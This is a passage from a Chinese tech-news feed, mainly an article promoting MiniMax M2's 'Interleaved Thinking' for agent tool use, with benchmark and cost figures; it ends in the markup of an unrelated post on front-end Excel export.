                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>昨日，有位推特博主晒出了国内几大开源模型在轻量级软件工程 Agent 基准测试 mini-SWE-agent 上的成绩。该基准主要测试大模型在真实软件开发任务中的多步推理、环境交互和工程化能力。</p>
<p>结果显示，MiniMax 新一代大模型 M2 的表现最佳，一举超越了 DeepSeek、GLM、Qwen、Kimi 等其他一众竞品厂商。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51596194527945afacd38d0d9ac8e351~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=XVilZyU2NOw6PgzilxxQuc9Qn%2FU%3D" alt="图片" loading="lazy"/></p>
<p>更多测试细节请查看：<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FKLieret%2Fstatus%2F1995949673551724717" target="_blank" title="https://x.com/KLieret/status/1995949673551724717" ref="nofollow noopener noreferrer">x.com/KLieret/sta…</a></p>
<p>作为一个发布之初以 Agent 和代码能力见长的大模型，MiniMax M2 在 mini-SWE-agent 测试中的亮眼表现并不令人意外。它不仅可以出色规划、稳定执行复杂长链条工具调用任务，还能协同调用 Shell、Browser、Python 代码执行器和其他各种 MCP 工具。</p>
<p>支撑这些能力的关键技术正是 MiniMax M2 所采用的「Interleaved Thinking」（交错思维）， 通俗地讲即是一边思考、一边调用工具。这一技术的加持，使得该模型能够在「思考 - 行动 - 反思」的闭环中持续积累上下文理解，并根据反馈实时调整策略。</p>
<p>这种更接近真实工程师的工作方式，显著提升了 MiniMax M2 的 Agent 执行能力，在复杂任务中规划性更强、执行稳健性更高、自我纠错能力更可靠，从而组成了其最具辨识度的核心优势。</p>
<p>发布仅仅一个多月，MiniMax M2 在实际 Agent 使用场景中获得了开发者的广泛认可。此前，推特博主 @elvis 表示，「MiniMax-M2 比我想象的要重要得多！我用 M2 构建了一个深度研究 Agent，交错思维确实不一般，它能在工具调用之间保留完整的内容块（思考 + 文本 + 工具调用），实现持续推理。这对自我改进的 Agent 非常有帮助。」</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89bb563ab5104ff195587128ae0ab3ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=VZsAfTcTukDD7piObfjDS6JVyOw%3D" alt="图片" loading="lazy"/></p>
<p>图源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fomarsar0%2Fstatus%2F1993325632961593417" target="_blank" title="https://x.com/omarsar0/status/1993325632961593417" ref="nofollow noopener noreferrer">x.com/omarsar0/st…</a></p>
<p>就在以 Agentic AI 为核心主题的 AWS re:Invent 2025 大会上，AWS CEO Matt Garman 宣布旗下模型库 Amazon Bedrock 迎来多个「新成员」，其中就包括了国产开源模型代表 MiniMax M2。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcee445a154349f899a41e12899a1c1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=KkvBsE6haUqAy9bWEIuvWxgaGg4%3D" alt="图片" loading="lazy"/></p>
<p>不禁好奇，Interleaved Thinking 在背后是如何驱动大模型变得「更能干活」的？带着这些疑问，我们对这项技术进行了一番深入探究。</p>
<p>崛起的「Interleaved Thinking」，正成为 Agent 模型标配</p>
<p>传统的 Chain-of-Thought（CoT）往往是「线性」的：模型先进行一次完整的思考规划，然后批量调用工具，最后根据结果生成答案。这种模式在简单的问答中有效，但在面对现实复杂任务时往往会「顾头不顾尾」，尤其是在多轮次推理、跨步骤决策和实时动态调整方面显得力不从心。</p>
<p>随着 Agent 任务的复杂程度越来越高，这类模式的局限更加明显，因此催生出了全新推理范式的需求。这也正是 Interleaved Thinking 得以迅速崛起的原因所在。</p>
<p>Interleaved Thinking 这一路径的核心思想可以追溯到 2022 年由普林斯顿大学与谷歌提出的 ReAct 框架，该框架系统性地提出将推理与行动（工具调用）交错进行。此后，Anthropic 提出的 Extended Thinking 在强调长时与长链路推理的同时进一步完善了与工具调用等 Agent 场景的协同。</p>
<p>基于这些工作，MiniMax M2 采用的 Interleaved Thinking 通过将推理贯穿于工具调用的每个步骤，在 Agent 执行过程中形成了高效稳定的「同步思考、实时调整、持续修正」循环。</p>
<p>具体来讲，Interleaved thinking 是在显性推理和工具使用之间交替进行，同时在各步骤之间将推理推进。它本质上是一个「思考 → 行动 → 观察 → 再思考」的动态循环。这一过程显著提升了规划、自我纠正和长期工作流程的可靠性。</p>
<p>早期的 ReAct 很大程度上是借助 Prompt 工程在外部框架里「硬凑」出的逻辑闭环，链路常因格式或解析问题而中断；而如今的 Interleaved Thinking（如 MiniMax M2、DeepSeek V3.2）则把这类思考 - 行动模式更深度地融入了模型及其推理流程，让它更接近一种「原生的思维直觉」，因而更加稳健。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69940551ad224cf9a69d96535c88a63e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=pfW5Ldqaf3ztIaj0MbPa3IzHQMI%3D" alt="图片" loading="lazy"/></p>
<p>图源：<a href="https://link.juejin.cn?target=https%3A%2F%2Ft.co%2Fu5DOdvTMtx" target="_blank" title="https://t.co/u5DOdvTMtx" ref="nofollow noopener noreferrer">t.co/u5DOdvTMtx</a></p>
<p>为什么它如此重要？</p>
<p>在长链路任务中，Agent 面临一个「致命杀手」：状态漂移。在复杂的 Agent 任务（如编写一个完整的游戏模组或进行深度行业调研）中，交互往往长达数十轮。如果模型在每一轮交互中丢弃了上一轮的推理过程，只保留工具的输出结果，模型就会陷入「失忆」状态。</p>
<p>它会忘记「我为什么要运行这行代码」或者「刚才那个报错排查到哪一步了」。这种上下文的断裂会导致模型重复执行无效操作，或者在多轮交互后偏离最初的目标。</p>
<p>而 Interleaved Thinking 从根源了解决了「状态漂移」问题，使得计划、意图和中间结论可以跨轮次延续。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da6cbc77b60d4f3bb405013099f2b869~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=Ui5EhDLWLA4abhLjjcCU%2BfEtU48%3D" alt="图片" loading="lazy"/></p>
<p>图源：<a href="https://link.juejin.cn?target=https%3A%2F%2Ft.co%2Fu5DOdvTMtx" target="_blank" title="https://t.co/u5DOdvTMtx" ref="nofollow noopener noreferrer">t.co/u5DOdvTMtx</a></p>
<p>看到这里，可能有读者会问：这不就是让模型「记性好」一点吗？它和现在热门的 Memory、Long Context 和 RAG 有什么区别？</p>
<p>其实，它们解决的是不同维度的「遗忘」问题。</p>
<p>普通的大模型记忆像电脑的硬盘。它侧重于「存事实」，记住的是用户的偏好、过往的知识库或几天前的对话摘要。 确保模型下次见到你，还记得你是谁，之前的项目背景是什么。</p>
<p>Interleaved Thinking 则像电脑的 RAM (内存)。它侧重于「存逻辑」，记住的是「我刚才为什么决定这么做」、「我对当前步骤的怀疑」、「我下一步的临时假设」，它用来维持正在运行的思维链状态。</p>
<p>当然，在实际工程中，这两者并非二元对立，而是互为表里。 我们往往需要 Long Context 作为巨大的容器，来承载 Interleaved Thinking 产生的大量推理过程。但如果不具备 Interleaved 的「思维动态维持」能力，单纯拉长 Context 只不过是给模型塞了一堆僵死的文字，模型依然会在海量信息中迷失方向。</p>
<p>简而言之，大模型记忆决定了 Agent 能「懂」多少过去，而 Interleaved Thinking 决定了 Agent 能「走」多远未来。</p>
<p>目前，Interleaved Thinking 这一技术正加速成为「行业共识」。除了 MiniMax 之外，很多其他头部大模型厂商也开始采纳：</p>
<ul>
<li>
<p>Kimi K2 thinking 原生支持 Thinking-in-Tools 能力，掌握了「边思考、边操作」的动态推理节奏；</p>
</li>
<li>
<p>Gemini 3 Pro 确立了「内部 Thinking 模式 + 思路签名（Thought Signature）」的标准，支持多轮 Context 回传与 Tool-use/Agent 的深度协同，确保持续推理不掉线；</p>
</li>
<li>
<p>DeepSeek V3.2 推出了首个将思考深度融入工具使用的 Thinking in Tool-Use 机制，在工具调用期间保留推理上下文，实现了思考与执行的无缝衔接。</p>
</li>
</ul>
<p>可以说，Interleaved Thinking 已不再是单一厂商的特色，而逐步成为高性能 Agent 模型的「标配」。</p>
<p>作为最早官方支持该技术的开源模型，MiniMax M2 在提升 Interleaved Thinking 的性能与效率上已经形成了自己独到的一套打法。</p>
<p>既强又省，MiniMax M2 用交错思维定义 Agent 新范式</p>
<p>Interleaved Thinking 的核心价值在于高强度的「工作记忆」维持能力。正是这种在每一步工具交互中保留并传递推理内容的机制，确保了 MiniMax M2 在执行长链路任务时，能够实现高效的自我修正、动态规划与样本复用，有效避免了逻辑中断。</p>
<p>根据 MiniMax M2 的实测数据，保持前轮思维状态带来了显著的性能提升：在充满不确定性、极度依赖「观察 - 调整」循环的 BrowseComp（网页浏览任务）中，保持前轮思维状态让性能从 31.4 跃升至 44.0，涨幅高达 40.1%；在 Tau² 复杂工具调用测试中，性能提升了 35.9%；即使是在本就极高难度的 SWE-Bench Verified 软件工程基准上，也依然取得了 3.3% 的显著增长。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b37c8716b88a4d748730e513d26719da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=Ofx22Zxaaw4NsM%2BvOPuMIYRJoYo%3D" alt="图片" loading="lazy"/></p>
<p>不仅强，而且极其「省」</p>
<p>为了验证这一机制在真实开发流中的威力，AI Agent 系统经理 Muratcan Koylan 构建了一个具体的演示：为设计系统团队自动生成一份简报。这项任务需要模型整理关键 Design Tokens（如颜色、排版、间距）、定义按钮组件的实现规范，以及输出可复用的开发模式。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af4557fca5604af4baf94bb0453f9df3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=XxxwOh7Z8vIbqkQwn12lj%2BGsq%2FA%3D" alt="图片" loading="lazy"/></p>
<p>图源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fkoylanai%2Fstatus%2F1990692277723734153" target="_blank" title="https://x.com/koylanai/status/1990692277723734153" ref="nofollow noopener noreferrer">x.com/koylanai/st…</a></p>
<p>在这个演示中，传统模型试图「一口吃成胖子」，一次性调用所有工具，容易导致结果偏差。而 M2 展现了清晰的节奏：先获取颜色 → 反思 → 再请求排版 → 再请求间距。这种「思考 → 行动 → 消化结果」的循环，让每一步决策都通过 reasoning_details 清晰可见，不再是黑盒。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0db90f2adc9475bbcf17650d38c61f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=nZccGGBi1FKmdLrzigHD8Ahirg0%3D" alt="图片" loading="lazy"/></p>
<p>对于开发者而言，技术先进性最终要通过成本和效率来落地。Muratcan 的测试数据还展示了 M2 惊人的经济性：在这个包含 8 步推理、7 次工具调用 的完整流程中，MiniMax M2 的总成本仅为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0.001669</mn><mtext>。相比同级别的</mtext><mi>C</mi><mi>l</mi><mi>a</mi><mi>u</mi><mi>d</mi><mi>e</mi><mi>S</mi><mi>o</mi><mi>n</mi><mi>n</mi><mi>e</mi><mi>t</mi><mtext>（约</mtext></mrow><annotation encoding="application/x-tex">0.001669。相比同级别的 Claude Sonnet（约 </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">0.001669</span><span class="mord cjk_fallback">。相比同级别的</span><span class="mord mathnormal" style="margin-right:0.01968em;">Cl</span><span class="mord mathnormal">a</span><span class="mord mathnormal">u</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">o</span><span class="mord mathnormal">nn</span><span class="mord mathnormal">e</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">（约</span></span></span></span></span>0.020），M2 便宜了近 12 倍。</p>
<p>这意味着，在相同的预算下，开发者可以使用 M2 进行 12 倍的迭代实验。Muratcan 指出，这种「高可见性 + 低成本」的组合，让快速迭代真正变得可行，这对于构建复杂的工具编排和开发工作流来说，是游戏规则的改变者。</p>
<p>如何榨干 M2 的全部性能？</p>
<p>尽管 MiniMax M2 能力强大，但在发布初期，官方社区反馈发现了一个普遍现象：很多开发者并没有正确「打开」 Interleaved Thinking。</p>
<p>常见误区包括：调用 API 时丢弃上一轮推理内容、或在使用 Anthropic 格式时过滤掉了 thinking blocks。一旦上下文断裂，模型只能从零推理，性能直接腰斩。</p>
<p>为了确保开发者能榨干 M2 的全部性能，MiniMax 提供了两种主流 API 格式的最佳实践：</p>
<ul>
<li>
<p>MiniMax 官方 API： 采用内容与推理分离的设计，推理过程通过独立的 reasoning_details 字段返回，清晰且易于解析。</p>
</li>
<li>
<p>Anthropic 兼容 API： 完美适配 Claude 生态，天然支持多类型内容块，只需保留并回传 thinking blocks 即可。</p>
</li>
</ul>
<p>这些实践表明了，MiniMax M2 正在为困扰业界已久的 Agent 落地难题，打开了一种全新的解决思路。</p>
<p>写在最后</p>
<p>在被称为 Agent 落地元年的 2025 年，直到现在仍有很多 AI 界人士持有悲观态度，比如 Andrej Karpathy，他在上上个月的一次访谈节目中表示，当前市面上的 AI Agent「令人失望」，并预计大约还需要 10 年时间，它们才可能发展到真正可用、可靠的状态。</p>
<p>这里首要解决的一大挑战便是：模型思考过程与工具执行之间真正实现丝滑、高效的协作。如今随着 Interleaved Thinking 的机制不断完善，其能力逐步得到充分释放，这一问题也随之有了可行性更高的技术解决方案。</p>
<p>当然，Interleaved Thinking 想要赢得更多厂商和开发者的青睐，少不了其他各环节的系统性支持。MiniMax M2 发布时，社区对该技术的支持非常有限。为了改变这一现状，MiniMax 采取多种途径推动该技术成为可复用的行业标准。</p>
<p>过去几周，MiniMax 与 Kilo Code、RooCode、Cline、OpenRouter、Ollama 等众多合作伙伴合作，提供了多个关键 PR，实现了这些编程工具、API 平台对 Interleaved Thinking + 原生工具调用的广泛、良好支持。同时，基于内部的 Benchmark，MiniMax 与合作伙伴一起对这些实现进行了测试，确保对应实现的正确性和效果。</p>
<p>以 Kilo Code 平台为例，其已经支持最新版本的 MiniMax M2，并默认启用了 Interleaved Thinking 与原生工具调用的功能。用户对此高度评价，「MiniMax M2 + 工具能力 + 免费开放 = 绝对的赢家组合」。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b5411c5d74a4c4897d7f9ff0f997219~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=qtVmsV7z%2F1f49ECZTxGdKUUqrQQ%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c573a1797d84baeafcada15895c20f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=TA6mEPV8I3qqPmxKtkftgK4KCWQ%3D" alt="图片" loading="lazy"/></p>
<p>图源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fkilocode%2Fstatus%2F1990419655991652649%3Fs%3D20" target="_blank" title="https://x.com/kilocode/status/1990419655991652649?s=20" ref="nofollow noopener noreferrer">x.com/kilocode/st…</a></p>
<p>此外，为了让开发者更快掌握 Interleaved Thinking 与 Agent 的最佳实践，MiniMax 开源了支持该技术的 Coding CLI——Mini-Agent。通过可直接运行的工程示例，用户可以直观地看到 MiniMax M2 通过 Interleaved Thinking 构建 Agent 的效果。下图展示了 Agent 使用其网页搜索工具在线获取最新信息，并为用户进行总结。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7d68aae549d740d2ad8b80a62e888bc7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=kgVNX1%2BTmc7lNPfBoDMc46b2T2k%3D" alt="图片" loading="lazy"/></p>
<p>目前，该项目已获得了 700 + 的 Star，在社区中的关注度持续提高。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82e2c57fa9654a429471c086a87deabb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765442958&amp;x-signature=Hj6hlpNbsI1h9vglwnjiF2ap7uk%3D" alt="图片" loading="lazy"/></p>
<p>GitHub 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMiniMax-AI%2FMini-Agent" target="_blank" title="https://github.com/MiniMax-AI/Mini-Agent" ref="nofollow noopener noreferrer">github.com/MiniMax-AI/…</a></p>
<p>社区和生态建设层面的一系列举措意味着，MiniMax 正为行业构建一套更标准化、工程化的 Agent 执行范式。这些举措也将加速让 Interleaved Thinking 从模型内部的技术特性演变为开发者可直接调用与集成的能力。</p>
<p>随着包括 MiniMax M2 在内的大模型展现出了高效稳定的 Agentic 能力，未来可能有更多厂商采用类似技术，并将推动更多 API 平台和编程工具完善相应的支持与适配。</p>
<p>Agent 迈向真正生产级阶段的转折点，或许已经从 Interleaved Thinking 开始了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[记一个前端导出excel受限问题]]></title>    <link>https://juejin.cn/post/7579832417747353651</link>    <guid>https://juejin.cn/post/7579832417747353651</guid>    <pubDate>2025-12-04T08:50:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579832417747353651" data-draft-id="7579499567869952050" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="记一个前端导出excel受限问题"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-04T08:50:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="至简简"/> <meta itemprop="url" content="https://juejin.cn/user/4212984286819384"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            记一个前端导出excel受限问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984286819384/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    至简简
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:50:10.000Z" title="Thu Dec 04 2025 08:50:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 